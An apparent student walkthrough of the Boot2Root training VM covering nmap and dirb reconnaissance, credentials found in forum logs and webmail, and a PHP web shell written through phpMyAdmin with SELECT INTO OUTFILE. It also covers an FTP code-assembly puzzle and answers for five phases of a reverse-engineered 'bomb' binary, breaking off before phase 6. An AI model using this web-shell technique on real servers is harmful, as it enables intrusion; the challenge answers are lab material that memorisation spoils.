ifconfig -a

-> vboxnet0 subnet => 192.168.56.0/24

nmap 192.168.56.0-255

Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-26 20:10 CEST
Nmap scan report for paul-f4Ar6s7.clusters.42paris.fr (192.168.56.1)
Host is up (0.00013s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
5900/tcp open  vnc
9100/tcp open  jetdirect

Nmap scan report for 192.168.56.105
Host is up (0.0011s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps


first one is our machine, second one is the vm

vm ip -> 192.168.56.105
http open
https open
ftp open
imap open

we run a kali docker to check the files on the server with dirb

docker pull kalilinux/kali-rolling
apt update
apt install -y dirb
dirb http://192.168.56.105 /usr/share/dirb/wordlists/common.txt

now we see there is an index, that give no info and a forum.

We try to view it with a web browser by going to https://192.168.56.105/forum/

in the forum, we find a long log file with multiple failed login attempts and then we see this line

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

this user is weird and looks like a password more than a user and we see that after that, there is a successful connexion to user lmezard so we think this is the password for this user (?)

ssh and ftp do not work with this user and password but we can login to the forum with it

we can find her name and e-mail laurie@borntosec.net

When we scanned the server ports with nmap, we saw a imap port which may tell us that a webmail is running.

We try to access this webmail server with lmezard's e-mail and the password we found before and it works.

We see 2 mails, one that seems to be really useful named "DB Access" and one named "Very Interesting"

In the mail we see :

```


Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.

```
so we now know how to connect to the db. We check if there is a phpmyadmin running and there is one and we can connect as root to it.

Connecting as root to the db is not the end though.

With select, we can create a new php page that would take an input as argument and show us the result :

```php
<?php
if (isset($_GET['command'])) {
    echo "<pre>" . shell_exec($_GET['command']) . "</pre>";
}
?>
```

SELECT "<?php if (isset($_GET['command'])) {echo '<pre>' . shell_exec($_GET['command']) . '</pre>';}?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"

Searching through the file system we found /home/LOOKATME/password with this inside

https://192.168.56.105/forum/templates_c/test3.php?command=cat%20/home/LOOKATME/password

lmezard:G!@M6f4Eatau{sF"

now we try to connect in ssh, doesn't work

we try to connect to ftp, it works

we get a fun file that is a tarball, after using tar -xpf on it we get a ft_fun folder, which contains 750 files with each one line of a c code and the order they have to be put in, so we use a small python script to get the code in the right order, remove all the useless comments and we get a c code, and when we compile and run it, we get 

MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit

so we do exactly that, we sha-256 it and try to connect to ssh

hash : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

in the ftp we also had a README file that contained

Complete this little challenge and use the result as password for user 'laurie' to login in ssh

so we connect with user 'laurie' in ssh

In the home, we have a readme and a 'bomb' executable

because we are very smart, we execute the bomb, it is an executable that waits for 6 password and if we don't have them correct, it explodes and just returns

the readme is an int saying

```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

because we did rainfall and override before this, we will reverse engineer the binary to get the passwords easily

now we have to defuse the bomb by getting the 6 passwords.

The first one is easy and just strcmp on "Public speaking is very easy." so we just enter it.

After that, we get a small math check that multiplies things in weird way in a loop, answer is easy to understand :

1 2 6 24 120 720

Third one gets an int, a char and an other int at the end then enters a switch statement, the first one is the case where the first int is 0, requires the char to be q and second int to be 777 so we enter that:

0 q 777

Fourth one gets an int, passes it through a fibonacci sequence and compares the result to 55 so we need to input the index of 55 in the fibonacci sequence:

9

Fifth phase is encrypting the string we give it and compares the output with "giants", we simply reverse it and check which characters we have to input to get the right output with a small python script

opekmq

Phase 6 is ennoying, doing it later, bye